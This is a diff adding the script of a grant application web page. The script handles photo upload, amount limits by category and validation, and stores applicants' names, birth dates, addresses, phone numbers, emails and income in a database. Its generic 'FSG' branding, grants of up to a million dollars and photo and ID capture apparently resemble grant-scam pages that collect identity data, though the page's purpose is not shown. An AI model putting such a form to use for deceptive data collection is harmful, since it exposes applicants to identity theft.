+document.getElementById('cameraInput').addEventListener('change', function() {
+  handlePhotoFile(this.files[0])
+})
+document.getElementById('galleryInput').addEventListener('change', function() {
+  handlePhotoFile(this.files[0])
+})
+
+function removePhoto() {
+  photoBase64 = null
+  document.getElementById('photoPreviewImg').src = ''
+  document.getElementById('photoPlaceholder').style.display = 'block'
+  document.getElementById('photoPreview').style.display = 'none'
+  document.getElementById('photoArea').classList.remove('has-photo')
+  document.getElementById('cameraInput').value = ''
+  document.getElementById('galleryInput').value = ''
+}
+
+// ── 3. MONEY INPUT FORMATTING ─────────────────────────
+const amountInput = document.getElementById('amount')
+const amountHint  = document.getElementById('amountHint')
+
+const MAX_GRANT = { 
+  'Small Business Development': 250000,
+  'Education & Training': 75000,
+  'Housing Assistance': 50000,
+  'Environmental & Agriculture': 500000,
+  'Healthcare & Community': 300000,
+  'Technology & Innovation': 1000000
+}
+
+function formatMoney(val) {
+  const digits = val.replace(/[^0-9]/g, '')
+  if (!digits) return ''
+  return parseInt(digits, 10).toLocaleString('en-US')
+}
+
+function getRawAmount() {
+  return parseInt(amountInput.value.replace(/[^0-9]/g, '') || '0', 10)
+}
+
+amountInput.addEventListener('input', function() {
+  const pos = this.selectionStart
+  const before = this.value.length
+  this.value = formatMoney(this.value)
+  const after = this.value.length
+  try { this.setSelectionRange(pos + (after - before), pos + (after - before)) } catch(e){}
+
+  const raw = getRawAmount()
+  const cat = document.getElementById('category').value
+  const max = MAX_GRANT[cat]
+
+  if (!raw) {
+    amountHint.textContent = 'Enter the amount you are requesting'
+    amountHint.className = 'field-hint'
+  } else if (max && raw > max) {
+    amountHint.textContent = `✗ Maximum for ${cat} is $${max.toLocaleString('en-US')}`
+    amountHint.className = 'field-hint invalid'
+    this.classList.add('invalid')
+    this.classList.remove('valid')
+  } else {
+    amountHint.textContent = `✓ $${raw.toLocaleString('en-US')} USD requested`
+    amountHint.className = 'field-hint valid'
+    this.classList.remove('invalid')
+    this.classList.add('valid')
+  }
+})
+
+// Update hint when category changes
+document.getElementById('category').addEventListener('change', function() {
+  const raw = getRawAmount()
+  if (raw > 0) amountInput.dispatchEvent(new Event('input'))
+})
+
+// ── 4. FORM SUBMISSION ────────────────────────────────
+function generateRef() {
+  return 'FSG-' + Date.now().toString().slice(-8)
+}
+
+document.getElementById('grantForm').addEventListener('submit', async (e) => {
+  e.preventDefault()
+  const errorBox = document.getElementById('errorBox')
+  errorBox.style.display = 'none'
+
+  const required = ['firstName','lastName','dob','email','phone','address','state','applicantType','category','amount','income','purpose']
+  let valid = true
+  required.forEach(id => {
+    const el = document.getElementById(id)
+    if (!el.value.trim()) { el.style.borderColor='#ef4444'; valid=false }
+    else el.style.borderColor=''
+  })
+
+  if (!document.getElementById('certify').checked) {
+    alert('Please read and check the certification before submitting.')
+    return
+  }
+  if (!valid) {
+    errorBox.style.display = 'block'
+    errorBox.textContent = '⚠ Please fill in all required fields marked with *'
+    window.scrollTo({ top: 0, behavior: 'smooth' })
+    return
+  }
+
+  const submitBtn = document.getElementById('submitBtn')
+  submitBtn.disabled = true
+  submitBtn.innerHTML = '<div class="spinner"></div><span>Submitting your application...</span>'
+
+  const ref = generateRef()
+  const raw = getRawAmount()
+
+  const payload = {
+    reference_number : ref,
+    first_name       : document.getElementById('firstName').value.trim(),
+    last_name        : document.getElementById('lastName').value.trim(),
+    email            : document.getElementById('email').value.trim(),
+    phone            : document.getElementById('phone').value.trim(),
+    date_of_birth    : document.getElementById('dob').value,
+    state            : document.getElementById('state').value,
+    address          : document.getElementById('address').value.trim(),
+    applicant_type   : document.getElementById('applicantType').value,
+    grant_category   : document.getElementById('category').value,
+    amount_requested : raw,
+    purpose          : document.getElementById('purpose').value.trim(),
+    income_range     : document.getElementById('income').value,
+    status           : 'pending',
+    submitted_at     : new Date().toISOString()
+  }
+
+  try {
+    const { error } = await db.from('applications').insert([payload])
+    if (error) throw new Error(error.message)
+    document.getElementById('successRef').textContent = ref
+    document.getElementById('formCard').style.display = 'none'
+    document.getElementById('successCard').style.display = 'block'
+    window.scrollTo({ top: 0, behavior: 'smooth' })
+  } catch (err) {
+    console.error(err)
+    submitBtn.disabled = false
+    submitBtn.innerHTML = '<span>📋</span><span>Submit Application</span>'
+    errorBox.style.display = 'block'
+    errorBox.textContent = '⚠ Submission failed: ' + (err.message || 'Please check your connection and try again.')
+  }
+})
+
+// Clear red borders on input
+document.querySelectorAll('input,select,textarea').forEach(el => {
+  el.addEventListener('input', () => { if(el.id !== 'nationalId' && el.id !== 'amount') el.style.borderColor='' })
+})
+</script>
+</body>
+</html>
